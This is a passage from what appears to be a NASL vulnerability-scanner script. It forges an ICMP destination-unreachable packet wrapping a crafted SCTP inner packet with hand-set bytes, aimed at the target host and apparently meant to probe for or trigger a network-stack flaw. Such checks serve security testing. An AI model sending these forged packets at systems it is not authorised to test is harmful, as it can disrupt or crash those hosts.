...
dst = get_host_ip();
id = rand();
ip = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0xC0, ip_off: 0, ip_p: IPPROTO_ICMP, ip_id: id, ip_ttl: 0x40, ip_src: this_host() );
ip2 = forge_ip_packet( ip_v: 4, ip_hl: 5, ip_tos: 0, ip_off: 0, ip_p: 132, ip_id: id + 1, ip_ttl: 0x40, ip_src: this_host(), data: "\x28\x00\x00\x50\x00\x00\x00\x00\xf9\x57\x1F\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" );
icmp = forge_icmp_packet( ip: ip, icmp_type: 3, icmp_code: 2, icmp_seq: 0, icmp_id: 0, data: ip2 );
